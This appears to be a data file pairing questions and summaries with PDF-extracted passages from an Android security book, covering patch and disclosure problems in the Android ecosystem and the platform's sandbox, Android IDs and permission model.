the app is written by\nGoogle, OEMs, carriers, or independent developers. In contrast, a security fl aw\nin the operating system itself requires deploying a fi rmware upgrade or OTA\nupdate. The process for creating and deploying these types of updates is far\nmore arduous.\nFor example, consider a patch for a fl aw in the core Android operating sys-\ntem. A patch for such an issue begins with Google fi xing the issue fi rst. This is\nwhere things get tricky and become device dependent. For Nexus devices, the\nupdated fi rmware can be released directly to end users at this point. However,\nupdating an OEM-branded device still requires OEMs to produce a build\nincluding Google’s security fi x. In another twist, OEMs can deliver the updated\nfi rmware directly to end users of unlocked OEM devices at this point. For carrier-\nsubsidized devices, the carrier must prepare its customized build including the\nfi x and deliver it to the customer base. Even in this simple example, the update\npath for operating system vulnerabilities is far more complicated than applica-\ntion updates. Additional problems coordinating with third-party developers or\nlow-level hardware manufacturers could also arise.\nUpdate Frequency\nAs previously mentioned, new versions of Android are adopted quite slowly.\nIn fact, this particular issue has spurred public outcry on several occasions. In\nApril 2013, the American Civil Liberties Union (ACLU) fi led a complaint with\nthe Federal Trade Commission (FTC). They stated that the four major mobile\ncarriers in the U.S. did not provide timely security updates for the Android\nsmartphones they sell. They further state that this is true even if Google has\npublished updates to fi x exploitable security vulnerabilities. Without receiving\ntimely security updates, Android cannot be considered a mature, safe, or secure\noperating system. It’s no surprise that people are looking for government action\non the matter.\nThe time delta between bug reporting, fi x development, and patch deployment\nvaries widely. The time between bug reporting and fi x development is often\nshort, on the order of days or weeks. However, the time between fi x development\nand that fi x getting deployed on an end user’s device can range from weeks to\nc01.indd 01:14:5:PM 02/24/2014 Page 19\n20 Chapter 1 ■ Looking at the Ecosystem\nmonths, or possibly never. Depending on the particular issue, the overall patch\ncycle could involve multiple ecosystem stakeholders. Unfortunately, end users\npay the price because their devices are left vulnerable.\nNot all security updates in the Android ecosystem are affected by these\ncomplexities to the same degree. For example, apps are directly updated by\ntheir authors. App authors’ ability to push updates in a timely fashion has led\nto several quick patch turnarounds in the past. Additionally, Google has proven\ntheir ability to deploy fi rmware updates for Nexus devices in a reasonable time\nframe. Finally, power users sometimes patch their own devices at their own risk.\nGoogle usually patches vulnerabilities in the AOSP tree within days or weeks\nof the discovery. At this point, OEMs can cherry-pick the patch to fi x the vulner-\nability and merge it into their internal tree. However, OEMs tend to be slow in\napplying patches. Unbranded devices usually get updates faster than carrier\ndevices because they don’t have to go through carrier customizations and car-\nrier approval processes. Carrier devices usually take months to get the security\nupdates, if they ever get them.\nBack-porting\nThe term back-porting refers to the act of applying the fi x for a current version\nof software to an older version. In the Android ecosystem, back-ports for secu-\nrity fi xes are mostly nonexistent. Consider a hypothetical scenario: The latest\nversion of Android is 4.2. If a vulnerability is discovered that affects Android\n4.0.4 and later, Google fi xes the vulnerability only in 4.2.x and later versions.\nUsers of prior versions such as 4.0.4 and 4.1.x are left vulnerable indefi nitely. It\nis believed that security fi xes may be back-ported in the event of a widespread\nattack. However, no such attack is publicly known at the time of this writing.\nAndroid Update Alliance\nIn May 2011, during Google I/O, Android Product Manager Hugo Barra announced\nthe Android Update Alliance. The stated goal of this initiative was to encour-\nage partners to make a commitment to update their Android devices for at\nleast 18 months after initial release. The update alliance was formed by HTC,\nLG, Motorola, Samsung, Sony Ericsson, AT&T, T-Mobile, Sprint, Verizon, and\nVodafone. Unfortunately, the Android Update Alliance has never been men-\ntioned again after the initial announcement. Time has shown that the costs of\ndeveloping new fi rmware versions, issues with legacy devices, problems in\nnewly released hardware, testing problems on new versions, or development\nissues could stand in the way of timely updates happening. This is especially\nproblematic on poorly selling devices where carriers and manufacturers have\nno incentive to invest in updates.\nc01.indd 01:14:5:PM 02/24/2014 Page 20\nChapter 1 ■ Looking at the Ecosystem 21\nUpdating Dependencies\nKeeping up with upstream open source projects is a cumbersome task. This\nis especially true in the Android ecosystem because the patch lifecycle is so\nextended. For example, the Android Framework includes a web browser engine\ncalled WebKit. Several other projects also use this engine, including Google’s\nown Chrome web browser. Chrome happens to have an admirably short patch\nlifecycle, on the order of weeks. Unlike Android, it also has a successful bug\nbounty program in which Google pays for and discloses discovered vulner-\nabilities with each patch release. Unfortunately, many of these bugs are pres-\nent in the code used by Android. Such a bug is often referred to as a half-day\nvulnerability. The term is born from the term half-life, which measures the rate\nat which radioactive material decays. Similarly, a half-day bug is one that is\ndecaying. Sadly, while it decays, Android users are left exposed to attacks that\nmay leverage these types of bugs.\nSecurity versus Openness\nOne of the most profound complexities in the Android ecosystem is between\npower users and security-conscious vendors. Power users want and need to\nhave unfettered access to their devices. Chapter 3 discusses the rationale behind\nthese users’ motivations further. In contrast, a completely secure device is in\nthe best interests of vendors and everyday end users. The needs of power users\nand vendors give rise to interesting challenges for researchers.\nAs a subset of all power users, security researchers face even more challeng-\ning decisions. When researchers discover security issues, they must decide\nwhat they do with this information. Should they report the issue to the vendor?\nShould they disclose the issue openly? If the researcher reports the issue, and\nthe vendor fi xes it, it might hinder power users from gaining the access they\ndesire. Ultimately, each researcher’s decision is driven by individual motiva-\ntions. For example, researchers routinely withhold disclosure when a publicly\nviable method to obtain access exists. Doing so ensures that requisite access is\navailable in the event that vendors fi x the existing, publicly disclosed methods.\nIt also means that the security issues remain unpatched, potentially allowing\nmalicious actors to take advantage of them. In some cases, researchers choose\nto release heavily obfuscated exploits. By making it diffi cult for the vendors to\ndiscover the leveraged vulnerability, power users are able to make use of the\nexploit longer. Many times, the vulnerabilities used in these exploits can only\nbe used with physical access to the device. This helps strike a balance between\nthe confl icting wants of these two stakeholder groups.\nVendors also struggle to fi nd a balance between security and openness. All\nvendors want satisfi ed customers. As mentioned previously, vendors modify\nc01.indd 01:14:5:PM 02/24/2014 Page 21\n22 Chapter 1 ■ Looking at the Ecosystem\nAndroid in order to please users and differentiate themselves. Bugs can be\nintroduced in the process, which detracts from overall security. Vendors must\ndecide whether to make such modifi cations. Also, vendors support devices after\nthey are purchased. Power user modifi cations can destabilize the system and\nlead to unnecessary support calls. Keeping support costs low and protecting\nagainst fraudulent warranty replacements are in the vendors’ best interests. To\ndeal with this particular issue, vendors employ boot loader locking mechanisms.\nUnfortunately, these mechanisms also make it more diffi cult for competent\npower users to modify their devices. To compromise, many vendors provide\nways for end users to unlock devices. You can read more about these methods\nin Chapter 3.\nPublic Disclosures\nLast but not least, the fi nal complexity relates to public disclosures, or public\nannouncement, of vulnerabilities. In information security, these announcements\nserve as notice for system administrators and savvy consumers to update the\nsoftware to remediate discovered vulnerabilities. Several metrics, including full\nparticipation in the disclosure process, can be used to gauge a vendor’s security\nmaturity. Unfortunately, such disclosures are extremely rare in the Android\necosystem. Here we document known public disclosures and explore several\npossible reasons why this is the case.\nIn 2008, Google started the android-security-announce mailing list on\nGoogle groups. Unfortunately, the list contains only a single post introducing\nthe list. You can fi nd that single message at https://groups.google.com/d/\nmsg/android-security-announce/aEba2l7U23A/vOyOllbBxw8J. After the initial\npost, not a single offi cial security announcement was ever made. As such, the\nonly way to track Android security issues is by reading change logs in AOSP,\ntracking Gerrit changes, or separating the wheat from chaff in the Android\nissue tracker at https://code.google.com/p/android/issues/list. These\nmethods are time consuming, error prone, and unlikely to be integrated into\nvulnerability assessment practices.\nAlthough it is not clear why Google has not followed through with their\nintentions to deliver security announcements, there are several possible reasons.\nOne possibility involves the extended exposure to vulnerabilities ramping in\nthe Android ecosystem. Because of this issue, it’s possible that Google views\npublicly disclosing fi xed issues as irresponsible. Many security professionals,\nincluding the authors of this text, believe that the danger imposed by such\na disclosure is far less than that of the extended exposure itself. Yet another\npossibility involves the complex partnerships between Google, device manufac-\nturers, and carriers. It is easy to see how disclosing a vulnerability that remains\npresent in a business partner’s product could be seen as bad business. If this\nc01.indd 01:14:5:PM 02/24/2014 Page 22"
  },
  {
    "input": "Which Android stakeholders have taken public disclosure of security issues seriously and what is their role in improving the security of the Android ecosystem?",
    "summary": "The chapter discusses the growth of the Android operating system and the various stakeholders involved, highlighting issues related to security and the lack of public disclosure by most vendors. It emphasizes the importance of public security disclosures for improving the overall security of the Android ecosystem. Qualcomm stands out as a vendor that takes public disclosure seriously, providing detailed security advisories and CVE numbers.",
    "output": "Chapter 1 ■ Looking at the Ecosystem 23\nis the case, it means Google is prioritizing a business relationship before the\ngood of the public.\nGoogle aside, very few other Android stakeholders on the vendor side have\nconducted public disclosures. Many OEMs have avoided public disclosure\nentirely, even shying away from press inquiries about hot-button vulnerabilities.\nFor example, while HTC has a disclosure policy posted at www.htc.com/www/\nterms/product-security/, the company has never made a public disclosure\nto date. On a few occasions, carriers have mentioned that their updates include\n“important security fi xes.” On even fewer occasions, carriers have even refer-\nenced public CVE numbers assigned to specifi c issues.\nThe Common Vulnerabilities and Exposures (CVE) project aims to create a cen-\ntral, standardized tracking number for vulnerabilities. Security professionals,\nparticularly vulnerability experts, use these numbers to track issues in software\nor hardware. Using CVE numbers greatly improves the ability to identify and\ndiscuss an issue across organizational boundaries. Companies that embrace\nthe CVE project are typically seen as the most mature since they recognize the\nneed to document and catalog past issues in their products.\nOf all of the stakeholders on the vendor side, one has stood out as taking\npublic disclosure seriously. That vendor is Qualcomm, with its Code Aurora\nforum. This group is a consortium of companies with projects serving the mobile\nwireless industry and is operated by Qualcomm. The Code Aurora website has\na security advisories page available at https://www.codeaurora.org/projects/\nsecurity-advisories, with extensive details about security issues and CVE\nnumbers. This level of maturity is one that other stakeholders should seek to\nfollow so that the security of the Android ecosystem as a whole can improve.\nIn general, security researchers are the biggest proponents of public disclosures\nin the Android ecosystem. Although not every security researcher is completely\nforthcoming, they are responsible for bringing issues to the attention of all of the\nother stakeholders. Often issues are publicly disclosed by independent research-\ners or security companies on mailing lists, at security conferences, or on other\npublic forums. Increasingly, researchers are coordinating such disclosures with\nstakeholders on the vendor side to safely and quietly improve Android security.\nSummary\nIn this chapter you have seen how the Android operating system has grown\nover the years to conquer the mobile operating system (OS) market from the\nbottom up. The chapter walked you through the main players involved in the\nAndroid ecosystem, explaining their roles and motivations. You took a close\nlook at the various problems that plague the Android ecosystem, including how\nthey affect security. Armed with a deep understanding of Android’s complex\nc01.indd 01:14:5:PM 02/24/2014 Page 23\n24 Chapter 1 ■ Looking at the Ecosystem\necosystem, one can easily pinpoint key problem areas and apply oneself more\neffectively to the problem of Android security.\nThe next chapter provides an overview of the security design and architecture\nof Android. It dives under the hood to show how Android works, including\nhow security mechanisms are enforced.\nc01.indd 01:14:5:PM 02/24/2014 Page 24"
  },
  {
    "input": "What are the key components and security mechanisms of the Android system architecture, and how do they contribute to the overall security design of the Android platform?",
    "summary": "Android's security design involves multiple layers, including a sandbox system that uses Linux-based UID/GID mappings (AIDs) and permissions to isolate applications and restrict their access to system resources. The platform's architecture includes Android applications, the Android Framework, DalvikVM, user-space native code, and the Linux kernel, each with specific security roles and mechanisms. The chapter also discusses how Android's security model, while effective, can have vulnerabilities that require multiple exploits to achieve full system access.",
    "output": "CHAPTER\n2\nAndroid Security Design\nand Architecture\nAndroid is comprised of several mechanisms playing a role in security checking\nand enforcement. Like any modern operating system, many of these mecha-\nnisms interact with each other, exchanging information about subjects (apps/\nusers), objects (other apps, fi les, devices), and operations to be performed (read,\nwrite, delete, and so on). Oftentimes, enforcement occurs without incident; but\noccasionally, things slip through the cracks, affording opportunity for abuse.\nThis chapter discusses the security design and architecture of Android, setting\nthe stage for analyzing the overall attack surface of the Android platform.\nUnderstanding Android System Architecture\nThe general Android architecture has, at times, been described as “Java on\nLinux.” However, this is a bit of a misnomer and doesn’t entirely do justice to the\ncomplexity and architecture of the platform. The overall architecture consists\nof components that fall into fi ve main layers, including Android applications,\nthe Android Framework, the Dalvik virtual machine, user-space native code,\nand the Linux kernel. Figure 2-1 shows how these layers comprise the Android\nsoftware stack.\n25\nc02.indd 01:14:22:PM 02/24/2014 Page 25\n26 Chapter 2 ■ Android Security Design and Architecture\nStock Android Apps\nLauncher2 Phone AlarmClock\nEmail Settings Camera\nYour Apps/Market Apps\nGallery Mms DeskClock\nCalendar Browser Bluetooth\nCalculator Contacts ...\nApp\nAPI\nandroid.*\nBinder\nSystem Services java.*\n(Apache Harmony)\nPower Manager Mount Service Status Bar Manager\nActivity Manager Notification Manager Sensor Service\nPackage Manager Location Manager Window Manager\nBattery Manager Surface Flinger ...\nDalvik/Android Runtime/Zygote\nJNI\nLibraries Hardware\nNative Daemons Init/Toolbox\nBionic/OpenGL/WebKit/... Abstraction Layer\nLinux Kernel\nWakelocks/Lowmem/Binder/Ashmem/Logger/RAM Console/...\nFigure 2-1: General Android system architecture\nSource: Karim Yaghmour of Opersys Inc. (Creative Commons Share-Alike 3.0 license)\nhttp://www.slideshare.net/opersys/inside-androids-ui\nAndroid applications allow developers to extend and improve the functionality\nof a device without having to alter lower levels. In turn, the Android Framework\nprovides developers with a rich API that has access to all of the various facilities\nan Android device has to offer—the “glue” between apps and the Dalvik virtual\nmachine. This includes building blocks to enable developers to perform common\ntasks such as managing user interface (UI) elements, accessing shared data stores,\nand passing messages between application components.\nBoth Android applications and the Android Framework are developed in the\nJava programming language and execute within the Dalvik virtual machine\n(DalvikVM). This virtual machine (VM) was specially designed to provide an\neffi cient abstraction layer to the underlying operating system. The DalvikVM\nis a register-based VM that interprets the Dalvik Executable (DEX) byte code\nformat. In turn, the DalvikVM relies on functionality provided by a number of\nsupporting native code libraries.\nThe user-space native code components of Android includes system services,\nsuch as vold and DBus; networking services, such as dhcpd and wpa_supplicant;\nand libraries, such as bionic libc, WebKit, and OpenSSL. Some of these services\nand libraries communicate with kernel-level services and drivers, whereas others\nsimply facilitate lower-level native operations for managed code.\nc02.indd 01:14:22:PM 02/24/2014 Page 26\nChapter 2 ■ Android Security Design and Architecture 27\nAndroid's underpinning is the Linus kernel. Android made numerous additions\nand changes to the kernel source tree, some of which have their own security\nramifi cations. We discuss these issues in greater detail in Chapters 3, 10, and\n12. Kernel-level drivers also provide additional functionality, such as camera\naccess, Wi-Fi, and other network device access. Of particular note is the Binder\ndriver, which implements inter-process communication (IPC).\nThe “Looking Closer at the Layers” section later in this chapter examines key\ncomponents from each layer in more detail.\nUnderstanding Security Boundaries and Enforcement\nSecurity boundaries, sometimes called trust boundaries, are specifi c places\nwithin a system where the level of trust differs on either side. A great example\nis the boundary between kernel-space and user-space. Code in kernel-space is\ntrusted to perform low-level operations on hardware and access all virtual and\nphysical memory. However, user-space code cannot access all memory due to\nthe boundary enforced by the central processing unit (CPU).\nThe Android operating system utilizes two separate, but cooperating, per-\nmissions models. At the low level, the Linux kernel enforces permissions using\nusers and groups. This permissions model is inherited from Linux and enforces\naccess to fi le system entries, as well as other Android specifi c resources. This is\ncommonly referred to as Android’s sandbox. The Android runtime, by way of\nthe DalvikVM and Android framework, enforces the second model. This model,\nwhich is exposed to users when they install applications, defi nes app permis-\nsions that limit the abilities of Android applications. Some permissions from the\nsecond model actually map directly to specifi c users, groups, and capabilities\non the underlying operating system (OS).\nAndroid’s Sandbox\nAndroid's foundation of Linux brings with it a well-understood heritage of\nUnix-like process isolation and the principle of least privilege. Specifi cally, the\nconcept that processes running as separate users cannot interfere with each\nother, such as sending signals or accessing one another’s memory space. Ergo,\nmuch of Android’s sandbox is predicated on a few key concepts: standard\nLinux process isolation, unique user IDs (UIDs) for most processes, and tightly\nrestricted fi le system permissions.\nAndroid shares Linux’s UID/group ID (GID) paradigm, but does not have the\ntraditional passwd and group fi les for its source of user and group credentials.\nInstead, Android defi nes a map of names to unique identifi ers known as Android\nIDs (AIDs). The initial AID mapping contains reserved, static entries for privileged\nc02.indd 01:14:22:PM 02/24/2014 Page 27\n28 Chapter 2 ■ Android Security Design and Architecture\nand system-critical users, such as the system user/group. Android also reserves\nAID ranges used for provisioning app UIDs. Versions of Android after 4.1 added\nadditional AID ranges for multiple user profi les and isolated process users (e.g., for\nfurther sandboxing of Chrome). You can fi nd defi nitions for AIDs in system/core/\ninclude/private/android_filesystem_config.h in the Android Open Source\nProject (AOSP) tree. The following shows an excerpt that was edited for brevity:\n#define AID_ROOT 0 /* traditional unix root user */\n#define AID_SYSTEM 1000 /* system server */\n#define AID_RADIO 1001 /* telephony subsystem, RIL */\n#define AID_BLUETOOTH 1002 /* bluetooth subsystem */\n...\n#define AID_SHELL 2000 /* adb and debug shell user */\n#define AID_CACHE 2001 /* cache access */\n#define AID_DIAG 2002 /* access to diagnostic resources */\n/* The 3000 series are intended for use as supplemental group id's only.\n* They indicate special Android capabilities\nthat the kernel is aware of. */\n#define AID_NET_BT_ADMIN 3001 /* bluetooth: create any socket */\n#define AID_NET_BT 3002 /* bluetooth: create sco,\nrfcomm or l2cap sockets */\n#define AID_INET 3003 /* can create AF_INET and\nAF_INET6 sockets */\n#define AID_NET_RAW 3004 /* can create raw INET sockets */\n...\n#define AID_APP 10000 /* first app user */\n#define AID_ISOLATED_START 99000 /* start of uids for fully\nisolated sandboxed processes */\n#define AID_ISOLATED_END 99999 /* end of uids for fully\nisolated sandboxed processes */\n#define AID_USER 100000 /* offset for uid ranges for each user */\nIn addition to AIDs, Android uses supplementary groups to enable pro-\ncesses to access shared or protected resources. For example, membership in the\nsdcard_rw group allows a process to both read and write the /sdcard directory,\nas its mount options restrict which groups can read and write. This is similar to\nhow supplementary groups are used in many Linux distributions.\nNOTE Though all AID entries map to both a UID and GID, the UID may not necessarily\nbe used to represent a user on the system. For instance, AID_SDCARD_RW maps to\nsdcard_rw, but is used only as a supplemental group, not as a UID on the system.\nc02.indd 01:14:22:PM 02/24/2014 Page 28\nChapter 2 ■ Android Security Design and Architecture 29\nAside from enforcing fi le system access, supplementary groups may also be\nused to grant processes additional rights. The AID_INET group, for instance,\nallows for users to open AF_INET and AF_INET6 sockets. In some cases, rights\nmay also come in the form of a Linux capability. For example, membership in the\nAID_INET_ADMIN group grants the CAP_NET_ADMIN capability, allowing the user to\nconfi gure network interfaces and routing tables. Other similar, network-related\ngroups are cited later in the “Paranoid Networking” section.\nIn version 4.3 and later, Android increases its use of Linux capabilities. For\nexample, Android 4.3 changed the /system/bin/run-as binary from being\nset-UID root to using Linux capabilities to access privileged resources. Here,\nthis capability facilitates access to the packages.list fi le.\nNOTE A complete discussion on Linux capabilities is out of the scope of this\nchapter. You can fi nd more information about Linux process security and Linux\ncapabilities in the Linux kernel’s Documentation/security/credentials.txt\nand the capabilities manual page, respectively.\nWhen applications execute, their UID, GID, and supplementary groups are\nassigned to the newly created process. Running under a unique UID and GID\nenables the operating system to enforce lower-level restrictions in the kernel,\nand for the runtime to control inter-app interaction. This is the crux of the\nAndroid sandbox.\nThe following snippet shows the output of the ps command on an HTC One\nV. Note the owning UID on the far left, each of which are unique for each app\nprocess:\napp_16 4089 1451 304080 31724 ... S com.htc.bgp\napp_35 4119 1451 309712 30164 ... S com.google.android.calendar\napp_155 4145 1451 318276 39096 ... S com.google.android.apps.plus\napp_24 4159 1451 307736 32920 ... S android.process.media\napp_151 4247 1451 303172 28032 ... S com.htc.lockscreen\napp_49 4260 1451 303696 28132 ... S com.htc.weather.bg\napp_13 4277 1451 453248 68260 ... S com.android.browser\nApplications can also share UIDs, by way of a special directive in the\napplication package. This is discussed further in the “Major Application\nComponents” section.\nUnder the hood, the user and group names displayed for the process are\nactually provided by Android-specifi c implementations of the POSIX functions\ntypically used for setting and fetching of these values. For instance, consider\nthe getpwuid function (defi ned in stubs.cpp in the Bionic library):\nc02.indd 01:14:22:PM 02/24/2014 Page 29\n30 Chapter 2 ■ Android Security Design and Architecture\n345 passwd* getpwuid(uid_t uid) { // NOLINT: implementing bad function.\n346 stubs_state_t* state = __stubs_state();\n347 if (state == NULL) {\n348 return NULL;\n349 }\n350\n351 passwd* pw = android_id_to_passwd(state, uid);\n352 if (pw != NULL) {\n353 return pw;\n354 }\n355 return app_id_to_passwd(uid, state);\n356 }\nLike its brethren, getpwuid in turn calls additional Android-specifi c functions,\nsuch as android_id_to_passwd and app_id_to_passwd. These functions then\npopulate a Unix password structure with the corresponding AID’s informa-\ntion. The android_id_to_passwd function calls android_iinfo_to_passwd to\naccomplish this:\nstatic passwd* android_iinfo_to_passwd(stubs_state_t* state,\nconst android_id_info* iinfo) {\nsnprintf(state->dir_buffer_, sizeof(state->dir_buffer_), \"/\");\nsnprintf(state->sh_buffer_, sizeof(state->sh_buffer_),\n\"/system/bin/sh\");\npasswd* pw = &state->passwd_;\npw->pw_name = (char*) iinfo->name;\npw->pw_uid = iinfo->aid;\npw->pw_gid = iinfo->aid;\npw->pw_dir = state->dir_buffer_;\npw->pw_shell = state->sh_buffer_;\nreturn pw;\n}\nAndroid Permissions\nThe Android permissions model is multifaceted: There are API permissions, fi le\nsystem permissions, and IPC permissions. Oftentimes, there is an intertwining\nof each of these. As previously mentioned, some high-level permissions map\nback to lower-level OS capabilities. This could include actions such as opening\nsockets, Bluetooth devices, and certain fi le system paths.\nTo determine the app user’s rights and supplemental groups, Android pro-\ncesses high-level permissions specifi ed in an app package’s AndroidManifest\n.xml fi le (the manifest and permissions are covered in more detail in the “Major\nApplication Components” section). Applications’ permissions are extracted from\nthe application’s manifest at install time by the PackageManager and stored in\n/data/system/packages.xml. These entries are then used to grant the appropriate\nc02.indd 01:14:22:PM 02/24/2014 Page 30\nChapter 2 ■ Android Security Design and Architecture 31\nrights at the instantiation of the app’s process (such as setting supplemental\nGIDs). The following snippet shows the Google Chrome package entry inside\npackages.xml, including the unique userId for this app as well as the permis-\nsions it requests:\n<package name=\"com.android.chrome\"\ncodePath=\"/data/app/com.android.chrome-1.apk\"\nnativeLibraryPath=\"/data/data/com.android.chrome/lib\"\nflags=\"0\" ft=\"1422a161aa8\" it=\"1422a163b1a\"\nut=\"1422a163b1a\" version=\"1599092\" userId=\"10082\"\ninstaller=\"com.android.vending\">\n<sigs count=\"1\">\n<cert index=\"0\" />\n</sigs>\n<perms>\n<item name=\"com.android.launcher.permission.INSTALL_SHORTCUT\" />\n<item name=\"android.permission.NFC\" />\n...\n<item name=\"android.permission.WRITE_EXTERNAL_STORAGE\" />\n<item name=\"android.permission.ACCESS_COARSE_LOCATION\" />\n...\n<item name=\"android.permission.CAMERA\" />\n<item name=\"android.permission.INTERNET\" />\n...\n</perms>\n</package>\nThe permission-to-group mappings are stored in /etc/permissions/\nplatform.xml. These are used to determine supplemental group IDs to set for\nthe application. The following snippet shows some of these mappings:\n...\n<permission name=\"android.permission.INTERNET\" >\n<group gid=\"inet\" />\n</permission>\n<permission name=\"android.permission.CAMERA\" >\n<group gid=\"camera\" />\n</permission>\n<permission name=\"android.permission.READ_LOGS\" >\n<group gid=\"log\" />\n</permission>\n<permission name=\"android.permission.WRITE_EXTERNAL_STORAGE\" >\n<group gid=\"sdcard_rw\" />\n</permission>\n...\nc02.indd 01:14:22:PM 02/24/2014 Page 31\n32 Chapter 2 ■ Android Security Design and Architecture\nThe rights defi ned in package entries are later enforced in one of two ways.\nThe fi rst type of checking is done at the time of a given method invocation and\nis enforced by the runtime. The second type of checking is enforced at a lower\nlevel within the OS by a library or the kernel itself.\nAPI Permissions\nAPI permissions include those that are used for controlling access to high-\nlevel functionality within the Android API/framework and, in some cases,\nthird-party frameworks. An example of a common API permission is\nREAD_PHONE_STATE, which is defi ned in the Android documentation as allowing\n“read only access to phone state.” An app that requests and is subsequently\ngranted this permission would therefore be able to call a variety of meth-\nods related to querying phone information. This would include methods in\nthe TelephonyManager class, like getDeviceSoftwareVersion, getDeviceId,\ngetDeviceId and more.\nAs mentioned earlier, some API permissions correspond to kernel-level enforce-\nment mechanisms. For example, being granted the INTERNET permission means\nthe requesting app’s UID is added as a member of the inet group (GID 3003).\nMembership in this group grants the user the ability to open AF_INET and\nAF_INET6 sockets, which is needed for higher-level API functionality, such as\ncreating an HttpURLConnection object.\nIn Chapter 4 we also discuss some oversights and issues with API permis-\nsions and their enforcement.\nFile System Permissions\nAndroid’s application sandbox is heavily supported by tight Unix fi le system\npermissions. Applications’ unique UIDs and GIDs are, by default, given access\nonly to their respective data storage paths on the fi le system. Note the UIDs\nand GIDs (in the second and third columns) in the following directory listing.\nThey are unique for these directories, and their permissions are such that only\nthose UIDs and GIDs may access the contents therein:\nroot@android:/ # ls -l /data/data\ndrwxr-x--x u0_a3 u0_a3 ... com.android.browser\ndrwxr-x--x u0_a4 u0_a4 ... com.android.calculator2\ndrwxr-x--x u0_a5 u0_a5 ... com.android.calendar\ndrwxr-x--x u0_a24 u0_a24 ... com.android.camera\n...\ndrwxr-x--x u0_a55 u0_a55 ... com.twitter.android\ndrwxr-x--x u0_a56 u0_a56 ... com.ubercab\ndrwxr-x--x u0_a53 u0_a53 ... com.yougetitback.androidapplication.virgin.\nmobile\ndrwxr-x--x u0_a31 u0_a31 ... jp.co.omronsoft.openwnn\nc02.indd 01:14:22:PM 02/24/2014 Page 32\nChapter 2 ■ Android Security Design and Architecture 33\nSubsequently, fi les created by applications will have appropriate fi le permissions\nset. The following listing shows an application’s data directory, with ownership\nand permissions on subdirectories and fi les set only for the app’s UID and GID:\nroot@android:/data/data/com.twitter.android # ls -lR\n.:\ndrwxrwx--x u0_a55 u0_a55 2013-10-17 00:07 cache\ndrwxrwx--x u0_a55 u0_a55 2013-10-17 00:07 databases\ndrwxrwx--x u0_a55 u0_a55 2013-10-17 00:07 files\nlrwxrwxrwx install install 2013-10-22 18:16 lib ->\n/data/app-lib/com.twitter.android-1\ndrwxrwx--x u0_a55 u0_a55 2013-10-17 00:07 shared_prefs\n./cache:\ndrwx------ u0_a55 u0_a55 2013-10-17 00:07\ncom.android.renderscript.cache\n./cache/com.android.renderscript.cache:\n./databases:\n-rw-rw---- u0_a55 u0_a55 184320 2013-10-17 06:47 0-3.db\n-rw------- u0_a55 u0_a55 8720 2013-10-17 06:47 0-3.db-journal\n-rw-rw---- u0_a55 u0_a55 61440 2013-10-22 18:17 global.db\n-rw------- u0_a55 u0_a55 16928 2013-10-22 18:17 global.db-journal\n./files:\ndrwx------ u0_a55 u0_a55 2013-10-22 18:18\ncom.crashlytics.sdk.android\n./files/com.crashlytics.sdk.android:\n-rw------- u0_a55 u0_a55 80 2013-10-22 18:18\n5266C1300180-0001-0334-EDCC05CFF3D7BeginSession.cls\n./shared_prefs:\n-rw-rw---- u0_a55 u0_a55 155 2013-10-17 00:07 com.crashlytics.prefs.\nxml\n-rw-rw---- u0_a55 u0_a55 143 2013-10-17 00:07\ncom.twitter.android_preferences.xml\nAs mentioned previously, certain supplemental GIDs are used for access to shared\nresources, such as SD cards or other external storage. As an example, note the output\nof the mount and ls commands on an HTC One V, highlighting the /mnt/sdcard path:\nroot@android:/ # mount\n...\n/dev/block/dm-2 /mnt/sdcard vfat rw,dirsync,nosuid,nodev,noexec,relatime,\nuid=1000,gid=1015,fmask=0702,dmask=0702,allow_utime=0020,codepage=cp437,\niocharset=iso8859-1,shortname=mixed,utf8,errors=remount-ro 0 0\n...\nroot@android:/ # ls -l /mnt\n...\nd---rwxr-x system sdcard_rw 1969-12-31 19:00 sdcard\nc02.indd 01:14:22:PM 02/24/2014 Page 33\n34 Chapter 2 ■ Android Security Design and Architecture\nHere you see that the SD card is mounted with GID 1015, which corresponds\nto the sdcard_rw group. Applications requesting the WRITE_EXTERNAL_STORAGE\npermission will have their UID added to this group, granting them write access\nto this path.\nIPC Permissions\nIPC permissions are those that relate directly to communication between app\ncomponents (and some system IPC facilities), though there is some overlap with\nAPI permissions. The declaration and enforcement of these permissions may\noccur at different levels, including the runtime, library functions, or directly\nin the application itself. Specifi cally, this permission set applies to the major\nAndroid application components that are built upon Android’s Binder IPC\nmechanism. The details of these components and Binder itself are presented\nlater in this chapter.\nLooking Closer at the Layers\nThis section takes a closer look at the most security-relevant pieces of the Android\nsoftware stack, including applications, the Android framework, the DalvikVM,\nsupporting user-space native code and associated services, and the Linux kernel.\nThis will help set the stage for later chapters, which will go into greater detail\nabout these components. This will then provide the knowledge necessary to\nattack those components.\nAndroid Applications\nIn order to understand how to evaluate and attack the security of Android\napplications, you fi rst need to understand what they’re made of. This section\ndiscusses the security-pertinent pieces of Android applications, the application\nruntime, and supporting IPC mechanisms. This also helps lay the groundwork\nfor Chapter 4.\nApplications are typically broken into two categories: pre-installed and user-\ninstalled. Pre-installed applications include Google, original equipment manu-\nfacturer (OEM), and/or mobile carrier-provided applications, such as calendar,\ne-mail, browser, and contact managers. The packages for these apps reside in the\n/system/app directory. Some of these may have elevated privileges or capabili-\nties, and therefore may be of particular interest. User-installed applications are\nthose that the user has installed themselves, either via an app market such as\nGoogle Play, direct download, or manually with pm install or adb install.\nThese apps, as well as updates to pre-installed apps, reside in the /data/app\ndirectory.\nc02.indd 01:14:22:PM 02/24/2014 Page 34\nChapter 2 ■ Android Security Design and Architecture 35\nAndroid uses public-key cryptography for several purposes related to applica-\ntions. First, Android uses a special platform key to sign pre-installed app packages.\nApplications signed with this key are special in that they can have system user\nprivileges. Next, third-party applications are signed with keys generated by\nindividual developers. For both pre-installed and user-installed apps, Android\nuses the signature to prevent unauthorized app updates.\nMajor Application Components\nAlthough Android applications consist of numerous pieces, this section highlights\nthose that are notable across most applications, regardless of the targeted version\nof Android. These include the AndroidManifest, Intents, Activities, BroadcastReceivers,\nServices, and Content Providers. The latter four of these components represent\nIPC endpoints, which have particularly interesting security properties.\nAndroidManifest.xml\nAll Android application packages (APKs) must include the AndroidManifest\n.xml fi le. This XML fi le contains a smorgasbord of information about the appli-\ncation, including the following:\n■ Unique package name (e.g., com.wiley.SomeApp) and version information\n■ Activities, Services, BroadcastReceivers, and Instrumentation defi nitions\n■ Permission defi nitions (both those the application requests, and custom\npermissions it defi nes)\n■ Information on external libraries packaged with and used by the application\n■ Additional supporting directives, such as shared UID information, pre-\nferred installation location, and UI info (such as the launcher icon for the\napplication)\nOne particularly interesting part of the manifest is the sharedUserId attri-\nbute. Simply put, when two applications are signed by the same key, they can\nspecify an identical user identifi er in their respective manifests. In this case,\nboth 